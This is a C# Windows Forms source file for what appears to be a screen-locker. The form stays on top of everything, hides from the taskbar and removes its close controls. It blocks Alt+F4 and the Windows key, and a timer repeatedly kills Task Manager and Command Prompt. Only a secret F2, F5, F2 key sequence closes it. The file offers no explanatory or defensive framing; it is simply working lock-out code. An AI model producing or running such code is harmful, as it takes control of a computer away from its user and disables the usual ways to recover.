using Microsoft.VisualBasic;
using System.ComponentModel;
using System.Net.Security;
using System;
using System.Windows.Forms;
using System.Diagnostics;

namespace app
{
    public partial class Form1 : Form
    {
        private bool next1;
        private bool next2;
        private bool next3;

        public Form1()
        {
            InitializeComponent();

            this.ControlBox = false;
            this.TopMost = true;
            this.KeyPreview = true;

            if (this.WindowState == FormWindowState.Minimized)
            {
                this.TopMost = true;
                this.WindowState = FormWindowState.Normal;
            }


        }
        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                e.Handled = true;
                MessageBox.Show("alt + f4?", "", MessageBoxButtons.OK);
            }
            if (e.KeyCode == Keys.LWin)
            {
                e.Handled = true;
            }
            if (e.KeyCode == Keys.F2)
            {
                next1 = true;
            }
            if (e.KeyCode == Keys.F5 && next1 == true)
            {
                next2 = true;
            }
            if (e.KeyCode == Keys.F2 && next2 == true)
            {
                next3 = true;
            }
            if (next3 == true)
            {
                this.Close();
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            this.ControlBox = false;
            this.TopMost = true;
            this.KeyPreview = true;
            this.ShowInTaskbar = false;
            this.Location = new Point(0, 0);
        }
        private void Timer1_Tick(object sender, EventArgs e)
        {
            foreach (Process process in Process.GetProcessesByName("taskmgr"))
            {
                process.Kill();
            }
            foreach (Process process in Process.GetProcessesByName("cmd"))
            {
                process.Kill();
            }
            Form1_Load(sender, e);
        }
    }

}